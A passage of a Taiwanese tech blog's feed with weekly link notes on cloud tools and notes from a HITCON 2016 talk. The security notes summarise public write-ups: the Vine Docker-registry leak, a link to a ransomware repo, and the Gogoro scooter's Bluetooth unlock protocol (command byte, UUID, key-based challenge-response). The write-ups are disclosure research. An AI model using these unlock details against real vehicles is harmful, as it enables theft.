誰是忘記穿衣服的黑魔鬼？&lt;br /&gt;
還有誰是喬洛斯？&lt;br /&gt;
竟然還說有個要把全套九把刀小說都看完才會知道的大彩蛋，&lt;br /&gt;
實在是太吊人胃口了。  &lt;/p&gt;</summary><category term="Novel"></category><category term="Giddens"></category><category term="九把刀"></category><category term="蟬堡"></category></entry><entry><title>Y2016W30</title><link href="https://blog.m157q.tw/posts/2016/08/01/y2016w30/" rel="alternate"></link><published>2016-10-14T13:36:52+08:00</published><updated>2016-10-14T13:36:52+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-08-01:posts/2016/08/01/y2016w30/</id><summary type="html">&lt;h3&gt;Gae&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/14458470/google-app-engines-ndb-get-an-entitys-id"&gt;google app engine's ndb: get an entity's id - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GAE 的 ndb 其實就是 Datastore 的 client。  &lt;/li&gt;
&lt;li&gt;因為最近在公司開發跟 GAE 有關的程式碼，想要從 Datastore 拿到資料的 ID，發現不知道怎麼拿，所以查了一下。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;複製貼上備忘一下  &lt;/p&gt;
&lt;p&gt;You can get the id with several ways provided you have the key.&lt;br /&gt;
Example with fetch or get:  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;message = Message.query(Message.name==someName).fetch(1)[0]&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;message_id = message.key.id()&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;message = Message.query(Message.name==someName).get()&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;message_id = message.key.id()&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;If you don't need the entity but only the id then you can save resources by getting only the key.  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;message_key = Message.query(Message.name==someName).fetch(1, keys_only=True)[0]&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;message_id = message_key.id()&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;message_key = Message.query(Message.name==someName).get(keys_only=True)&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;message_id = message_key.id()&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;Keep in mind that you can get the key after a put as well:  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;message_key = message.put()&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;message_id = message_key.id()&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/datastore/docs/apis/gql/gql_reference?hl=en_GB&amp;amp;_ga=1.75913941.1514764281.1456334755"&gt;GQL Reference|Cloud Datastore|Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近要從 Datastore 裡頭拿資料出來，所以學了一下 GQL 的語法。  &lt;/li&gt;
&lt;li&gt;基本上跟 SQL 差不多。  &lt;/li&gt;
&lt;li&gt;但 Datastore 要注意的是，因為其本身是 NoSQL 的結構，所以要做 query 的話，其對應的 condition 必須要有 composite index 才行，所以要更改 &lt;code&gt;index.yaml&lt;/code&gt;，並且要 &lt;code&gt;update&lt;/code&gt;。一般來說使用官方提供的 GAE SDK 的 &lt;code&gt;dev_appserver.py&lt;/code&gt; 這個指令在 local 跑起測試的 GAE server 時，就會順便幫忙檢查，如果有用到新的 index 的話就會自動改寫 index.yaml 了，還算方便。  &lt;/li&gt;
&lt;li&gt;但要建 composite index 的話，跟該 composite index 相關的所有 columns 都要有 index，否則就無法成功建立，所以建議不要沒事把 datastore 對每個 column 預設開啟的 index 關掉，除非真的確定不會用到 query，否則哪天要加 composite index 的話會很麻煩。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Paper&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dl.acm.org/citation.cfm?id=584494"&gt;General approaches for implementing seamless handover&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近公司在做架構上的 migration，一直試圖想做到 zero downtime，有人就丟了這個名詞出來，查了一下，查到這篇論文。  &lt;/li&gt;
&lt;li&gt;原來就叫 "Seamless handover" 呀  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://imgur.com/KGrV41o"&gt;Harry speaks python - Imgur&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;寫 Python 的天天都在說爬說語。  &lt;/li&gt;
&lt;li&gt;然後爬說語的英文是 Parseltongue，爬說嘴的英文則是 Parselmouth。(&lt;a href="http://www.crown.com.tw/harrypotter/english/P.htm"&gt;source&lt;/a&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Paper"></category><category term="Joke"></category><category term="Gae"></category><category term="Job"></category><category term="Gcp"></category></entry><entry><title>Y2016W29</title><link href="https://blog.m157q.tw/posts/2016/07/25/y2016w29/" rel="alternate"></link><published>2016-10-12T13:53:59+08:00</published><updated>2016-10-12T13:53:59+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-07-25:posts/2016/07/25/y2016w29/</id><summary type="html">&lt;h3&gt;Emacs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/emacs-tw/emacs-101"&gt;emacs-tw/emacs-101: Emacs 101 - 一本讓你學 Emacs 不再學得靠北靠母的美好的新手求生指南&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;但重點好像是這個 repo 的 commit message XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Gcp&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/logging/docs/view/advanced_filters"&gt;Advanced Logs Filters  |  Stackdriver Logging  |  Google Cloud Platform&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GAE 的 logging 有個 advanced filter 可用，有時候需要看一些特定的 log 會需要用到。  &lt;/li&gt;
&lt;li&gt;其實 advanced fitler 的語法還好，每次開這份文件主要都是用來查欄位名稱用的，從來沒把那些欄位名稱記熟過。  &lt;/li&gt;
&lt;li&gt;雖然大多時候用預設的 filter 就差不多了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/coolwanglu/pdf2htmlEX"&gt;coolwanglu/pdf2htmlEX&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;把 PDF 轉成 HTML 的工具。用 C++ 寫的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mdswanson.com/blog/2011/07/23/digging-around-the-github-api-take-2.html"&gt;Making a commit with the Github API&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;因為 side project 而研究的東西  &lt;/li&gt;
&lt;li&gt;主要是想要做到自動 &lt;code&gt;git add&lt;/code&gt;, &lt;code&gt;git commit&lt;/code&gt;, &lt;code&gt;git push&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;其實就是想要每週自動生成這種 weekly post 到我自己的 blog 上啦  &lt;/li&gt;
&lt;li&gt;看完這篇以後還是沒有很懂，但有個大概的瞭解了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tenex/github-contributions"&gt;tenex/github-contributions: Find all contributions for a user through the GitHub Archive&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個用來找某個 user 對哪些 GitHub public repo 有 contributions 的工具  &lt;ul&gt;
&lt;li&gt;除了紀錄哪些 repo 以外，也有紀錄 events。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;資料最早只到 2011 年  &lt;/li&gt;
&lt;li&gt;2011 ~ 2014 的資料是從作者存好的 BigQuery Dataset 拿的  &lt;ul&gt;
&lt;li&gt;作者是說實際上資料的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015 年以後的資料是從 &lt;a href="https://www.githubarchive.org/"&gt;GitHub Archive&lt;/a&gt; 拿的  &lt;/li&gt;
&lt;li&gt;網頁版在這： &lt;a href="http://githubcontributions.io/"&gt;GitHub Contributions Archive&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Markdown&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/webpro/reveal-md"&gt;webpro/reveal-md: reveal.js on steroids! Get beautiful reveal.js presentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;官方網頁： &lt;a href="http://webpro.github.io/reveal-md/"&gt;http://webpro.github.io/reveal-md/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;幫你開個 local server 並把 markdown render 成有 reveal.js 特效的網頁  &lt;/li&gt;
&lt;li&gt;要給 talk 的話應該滿好用的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Medium&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@CloudSploit/we-made-the-whole-company-serverless-5a91c27cd8c4"&gt;We Made the Whole Company “Serverless” — Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Serverless 正夯，這間公司搭上了熱潮，把公司裡頭所有服務都換成 Serverless 架構。  &lt;/li&gt;
&lt;li&gt;紀錄的滿詳細的  &lt;/li&gt;
&lt;li&gt;最後的結論是  &lt;ul&gt;
&lt;li&gt;用了 Serverless 架構以後，他們在 AWS 上的 cost 降低了。  &lt;ul&gt;
&lt;li&gt;因為現在只要針對有使用的部份付費，不像以前要開 virtual machine 不管有沒有 serving requests，只要開著就要付費。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;得到了極大的 Scalibility  &lt;/li&gt;
&lt;li&gt;鼓勵大家儘量採用此種架構，以避免凌晨三點看到 VM instance 噴說硬碟空間不夠的錯誤訊息。  &lt;blockquote&gt;
&lt;p&gt;嘛... Serverless 這個就跟 Docker 一樣，一堆人說拿來開發挺方便的，但用在 production 上常常會踩到雷。&lt;br /&gt;
不過主要的問題應該是，原本的架構要改成 serverless 要花費許多心力，新的專案拿來嘗試看看可能會是個比較好的作法。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Security&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://thehackernews.com/2016/07/tor-anonymity-node.html"&gt;Core Tor Contributor Leaves Project; Shutting Down Important Tor Nodes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://bobao.360.cn/news/detail/3311.html"&gt;只针对中国用户的勒索软件：cuteRansomware使用Google文档存储信息&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;臺灣人寫的 XDDD  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/aaaddress1/my-Little-Ransomware"&gt;easy ransomware module base on csharp.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://resources.netskope.com/h/i/271578954-cuteransomware-uses-google-docs-to-fly-under-radar"&gt;cuteRansomware Uses Google Docs to Fly Under Radar&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.hackersonlineclub.com/2016/07/mara-mobile-application-reverse.html"&gt;MARA: A Mobile Application Reverse Engineering and Analysis Framework Tool&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/xtiankisutsa/MARA_Framework"&gt;xtiankisutsa/MARA_Framework: MARA is a Mobile Application Reverse engineering and Analysis Framework.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;不知道好不好用，README 裏面看到滿多當年大學專題用到的工具，但沒像作者這麼厲害把所有東西都集合起來變 framework。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/"&gt;How we broke PHP, hacked Pornhub and earned $20,000 | Bug Bounties - Evonid&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯，算是 PronHub Bug Bounty 的 write-up  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://avicoder.me/2016/07/22/Twitter-Vine-Source-code-dump/"&gt;Twitter's Vine Source code dump — 6 Seconds are not enough » Whiskey Tango &lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本的 domain name bruteforce searching  &lt;/li&gt;
&lt;li&gt;找到有趣的網址 &lt;code&gt;docker.vineapp.com&lt;/code&gt; 後進去  &lt;/li&gt;
&lt;li&gt;看到網頁顯示 &lt;code&gt;/* private docker registry */&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;作者：「既然是 private 的那為什麼我看得到呢？」  &lt;/li&gt;
&lt;li&gt;於是作者不相信網頁訊息，透過 docker API 去拿到上面儲存的 docker images 的 tag 之後  &lt;/li&gt;
&lt;li&gt;看到有個 &lt;code&gt;/library/vinewww&lt;/code&gt;，把它用 &lt;code&gt;docker pull&lt;/code&gt; 下來後，發現就拿到 Vine 的 source code 了  &lt;/li&gt;
&lt;li&gt;還可以直接 run 起來，也看到是用 Python 的 Flask 跑起來的。  &lt;/li&gt;
&lt;li&gt;這個漏洞其實挺蠢的，不過滿多大公司都會有這樣的問題，畢竟樹大必有枯枝，總是會有些被遺忘的 server。  &lt;ul&gt;
&lt;li&gt;今年 HITCON 的 keynote, Orange 也提過了這類型的狀況，通常就是比快，還要一點運氣。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Taiwan&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/g0v/workweek"&gt;g0v/workweek: 勞基法計算機&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@yurenju/%E5%8B%9E%E5%9F%BA%E6%B3%95%E4%BF%AE%E6%B3%95%E8%A8%88%E7%AE%97%E6%A9%9F-8f570d45d4ae#.5vl4ilcx3"&gt;開發勞基法計算機才知道的荒謬 — Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;加班費的算法真的是很...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://worktime.goodjob.life/"&gt;工時透明化運動&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/goodjoblife/WorkTimeSurvey"&gt;goodjoblife/WorkTimeSurvey: A simple website for surveying work time.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Tool&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://app.grammarly.com/"&gt;Free Grammar Checker | Grammarly&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看到 Youtube 的廣告後覺得很厲害註冊來用  &lt;/li&gt;
&lt;li&gt;但後來覺得自己打什麼都會被紀錄實在有點可怕  &lt;/li&gt;
&lt;li&gt;所以就沒用了  &lt;/li&gt;
&lt;li&gt;所以我也不知道效果如何  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://imgur.com/86AQwOO"&gt;用小魔仙加一支手機自幹空拍機&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;也不知道真的還假的 LOL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Misc&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.bs2.to/"&gt;再見了，BBS。&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;交大的 BBS 關站  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://shopping.udn.com/mall/cus/event/eventPage.do?header=false&amp;amp;type=UD&amp;amp;url=http://img.udn.com/art/UDesign/event/201607/animal_savior/index.html"&gt;uDesign&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個跳蛋的設計真有創意 www  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Markdown"></category><category term="Github"></category><category term="Joke"></category><category term="Emacs"></category><category term="Taiwan"></category><category term="Security"></category><category term="Medium"></category><category term="Misc"></category><category term="Wikipedia"></category><category term="Gcp"></category><category term="Tool"></category></entry><entry><title>HITCON 2016 CMT</title><link href="https://blog.m157q.tw/posts/2016/07/23/hitcon-2016-cmt/" rel="alternate"></link><published>2016-07-23T19:45:43+08:00</published><updated>2016-07-23T19:45:43+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-07-23:posts/2016/07/23/hitcon-2016-cmt/</id><summary type="html">&lt;h1&gt;Day 1 (2016/07/22 Fri)&lt;/h1&gt;
&lt;h2&gt;Keynote / 從人工搶旗到機器人攻防（From CTF to CGC) 談資安人才培育&lt;/h2&gt;
&lt;h3&gt;Speaker: 交通大學資訊技術服務中心 黃世昆 Shih-Kun Huang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CGC (Cyber Grand Challenge)  &lt;ul&gt;
&lt;li&gt;CQE  &lt;/li&gt;
&lt;li&gt;CFE  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ForAllSecure CRS  &lt;ul&gt;
&lt;li&gt;Symbolic Fuzzer =&amp;gt; 深、慢  &lt;/li&gt;
&lt;li&gt;Random Fuzzer =&amp;gt; 淺、快  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CRS Integration Attack  &lt;ul&gt;
&lt;li&gt;Target-aware symbolic fuzzing  &lt;/li&gt;
&lt;li&gt;測、脅、隱、控  &lt;ul&gt;
&lt;li&gt;Fuzzing, Exploit, Anti-mitigation, Post-exploitation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CRS Integration Defense  &lt;/li&gt;
&lt;li&gt;CRAX - World Second Auto Exploitation Generator (Simple Live Demo)  &lt;ul&gt;
&lt;li&gt;Symbolic Execution  &lt;/li&gt;
&lt;li&gt;Concolic Execution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hacker's Tool Chain  &lt;ul&gt;
&lt;li&gt;Bug Fuzzzer  &lt;/li&gt;
&lt;li&gt;Crash Detector / Failure Monitor  &lt;/li&gt;
&lt;li&gt;Exploit Code Generator  &lt;ul&gt;
&lt;li&gt;目前缺少的一塊  &lt;/li&gt;
&lt;li&gt;目前分辨 Hacker 跟 Script Kiddie 的差別就在於會不會撰寫 Exploit，但要是之後 Exploit 能夠自動產生的話，Hacker 與 Script Kiddie 的分界就會消失，屆時 Hacker 又該以什麼為主要價值？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Shell-code Forger  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;物聯網 BLE 認證機制設計的挑戰：以 Gogoro Smart Scooter 為例&lt;/h2&gt;
&lt;h3&gt;Speaker:  GD&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Bluetooth 4.0 有三種  &lt;ul&gt;
&lt;li&gt;High Speed  &lt;/li&gt;
&lt;li&gt;Classic  &lt;/li&gt;
&lt;li&gt;Low Energy (BLE)  &lt;ul&gt;
&lt;li&gt;類似 HTTP：session-less 有七種 method  &lt;/li&gt;
&lt;li&gt;很容易控制  &lt;ul&gt;
&lt;li&gt;可以在捷運上讓旁邊的小米手環一直振動。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;很多物聯網裝置送的封包都沒加密  &lt;ul&gt;
&lt;li&gt;Security Manager Protocol  &lt;/li&gt;
&lt;li&gt;BLE 4.0 SMP 配對方式  &lt;ul&gt;
&lt;li&gt;Just Works: 沒有保護，很容易被 MITM 攻擊  &lt;/li&gt;
&lt;li&gt;Passkey Entry  &lt;/li&gt;
&lt;li&gt;Out-Of-Band  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BLE 4.0 隱私保護  &lt;ul&gt;
&lt;li&gt;硬體識別元 讀取限制  &lt;/li&gt;
&lt;li&gt;硬體識別元 亂數化  &lt;/li&gt;
&lt;li&gt;無硬體識別元，增加驗證機制設計的困難  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gogoro smart scooter  &lt;ul&gt;
&lt;li&gt;Key Fob Unlock (BLE)  &lt;ul&gt;
&lt;li&gt;Better than keeloq  &lt;/li&gt;
&lt;li&gt;類似 Challenge &amp;amp; Response 的過程  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile App (Gateway)  &lt;ul&gt;
&lt;li&gt;交車設定 My Gogoro 帳號  &lt;/li&gt;
&lt;li&gt;App 登入下載 Scooter 資訊  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Mobile App Pairing &amp;amp; Unlock  &lt;ul&gt;
&lt;li&gt;配對過程僅 ATT 讀寫資訊，沒有使用 BLE 原生的配對設定。  &lt;/li&gt;
&lt;li&gt;問題定義  &lt;ul&gt;
&lt;li&gt;BLE 未配對，無硬體識別元，如何設計認証機制？ =&amp;gt; App 和機車裏面要有同把 key，而這個 key 從 Server 來。（登入下載到 App 上）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BLE Gogoro Service  &lt;ul&gt;
&lt;li&gt;Service UDID 末 8 byte 為 Scooter MAC Address  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;App Protocol 分析  &lt;ul&gt;
&lt;li&gt;發現有大概二十幾組 Command  &lt;ul&gt;
&lt;li&gt;A 開頭為一般資訊查詢  &lt;/li&gt;
&lt;li&gt;B 開頭為 Challenge 相關指令  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unlock 流程  &lt;ul&gt;
&lt;li&gt;Scooter 掃描附近 Peripheral 是否有 GATT Gogoro 服務。 UUID 351AAF0F-末 8 byte 同 Scooter MAC Address 才連上  &lt;/li&gt;
&lt;li&gt;Mobile App 讀取 Scooter 目前狀態，啟用解鎖按鈕。按下按鈕後送出 ECU_Cmd(0xB4) Value 上鎖 0x00, 解鎖 0x01  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;車鑰匙 &lt;code&gt;Security_Key&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;ECU_Response=SHA256(ECU_Challenge, Security_Key)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Insecure App Data Storage  &lt;ul&gt;
&lt;li&gt;Token, Certificate 應該放在加密儲存區  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unlock 模擬程式  &lt;ul&gt;
&lt;li&gt;根據上述分析結果，撰寫可 Unlock 已知 Security_Key 的 Scooter 的 Android App。（只要 Security_Key leak 的話就可能會被 Hacker 控制）  &lt;/li&gt;
&lt;li&gt;因此得知：  &lt;ul&gt;
&lt;li&gt;攻擊者只要取得 Security_Key 就能解鎖 Gogoro  &lt;/li&gt;
&lt;li&gt;Security_Key 可被轉移到其他手機使用  &lt;/li&gt;
&lt;li&gt;Scooter 無法驗證 Mobile 裝置識別元  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Security_Key 可能 Leak 的途徑  &lt;ul&gt;
&lt;li&gt;車主在 Gogoro 官網的帳號密碼被破解  &lt;/li&gt;
&lt;li&gt;車主手機的備份檔流出  &lt;/li&gt;
&lt;li&gt;車主手機使用不安全的連線導致 Security_Key 流出  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Gogoro 分析結果  &lt;ul&gt;
&lt;li&gt;裝置識別元隱私保護 =&amp;gt; 提高驗證設計難度  &lt;/li&gt;
&lt;li&gt;Insecure App Data Storage 弱點  &lt;/li&gt;
&lt;li&gt;其他可能威脅  &lt;ul&gt;
&lt;li&gt;取 Security_Key API 沒有 SSL Cert Pining 可能被 MITM  &lt;/li&gt;
&lt;li&gt;Challenge-Response 可能被 Relay-Attack  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;大體來說 Gogoro 系統設計是安全的  &lt;ul&gt;
&lt;li&gt;藍牙傳輸雖然沒有配對與加密，但是傳輸的是一次性的 Challenge/Response  &lt;/li&gt;
&lt;li&gt;在手機端，金鑰基本上是綁手機，除非手機有自己做破解，而且被安裝後門程式，不然不容易直接從手機取得 Security_Key  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;威脅情境  &lt;ul&gt;
&lt;li&gt;車主手機被植入木馬  &lt;/li&gt;
&lt;li&gt;...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;弱點通報廠商  &lt;ul&gt;
&lt;li&gt;Gogoro 處理的態度非常積極  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;IoT 裝置認証設計的挑戰  &lt;ul&gt;
&lt;li&gt;無法讀取裝置識別元  &lt;ul&gt;
&lt;li&gt;IoT 裝置事先不認識手機  &lt;/li&gt;
&lt;li&gt;IoT 裝置事先  認識金鑰  &lt;/li&gt;
&lt;li&gt;藉由 Server 把金鑰給手機  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;防止金鑰被複製  &lt;ul&gt;
&lt;li&gt;BLE 4.2 Secure Connections  &lt;/li&gt;
&lt;li&gt;金鑰+手機裝置識別元  &lt;/li&gt;
&lt;li&gt;金鑰 Secure Element 儲存  &lt;/li&gt;
&lt;li&gt;金鑰+ Server SMS OTP  &lt;ul&gt;
&lt;li&gt;綁門號，不綁定手機。  &lt;/li&gt;
&lt;li&gt;SMS 要錢，需要電信門號，IoT 裝置需跟 Server 同步。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;金鑰+ Dual Counter 強化認証  &lt;ul&gt;
&lt;li&gt;綁定手機，可察覺金鑰盜用。  &lt;/li&gt;
&lt;li&gt;未必能阻擋金鑰盜用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;雙計數器強化認証  &lt;ul&gt;
&lt;li&gt;手機只存暫時性的 Key，如果被偷的話，可以 Revoke 掉。  &lt;/li&gt;
&lt;li&gt;真正的 Key 存在 Server  &lt;/li&gt;
&lt;li&gt;如果有其他裝置啟動自己的車子的話，計數器的數字會不 Match，可以察覺到有別人存取過自己的車子。  &lt;/li&gt;
&lt;li&gt;察覺到的話，可以把手機上的暫時性的 Key revoke 掉，換一把新的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;介紹 Bluetooth Low Energy 安全性分析流程  &lt;/li&gt;
&lt;li&gt;Smartphone 透過 BLE 控制 IoT 裝置，需要一套認証機制  &lt;/li&gt;
&lt;li&gt;BLE 4.0 配對有許多限制，故廠商選擇另外設計自己的配對機制。  &lt;/li&gt;
&lt;li&gt;消費者隱私重視下，硬體識別元受限且亂數化。  &lt;/li&gt;
&lt;li&gt;提供一種更好的認証機制：雙計數器強化認証  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;未來展望  &lt;ul&gt;
&lt;li&gt;因為這台每天都要騎，所以不敢拆來研究 XDD  &lt;/li&gt;
&lt;li&gt;Key Fob 晶片演算法研究  &lt;/li&gt;
&lt;li&gt;Challenge nonce 亂數強度  &lt;/li&gt;
&lt;li&gt;是否可從 ECU 或其他管道取得 &lt;code&gt;Security_Key&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Q&amp;amp;A  &lt;ul&gt;
&lt;li&gt;所以手機上那把 &lt;code&gt;Security_Key&lt;/code&gt; 被幹走的話，目前是無法換新的 &lt;code&gt;Security_Key&lt;/code&gt; 的？  &lt;ul&gt;
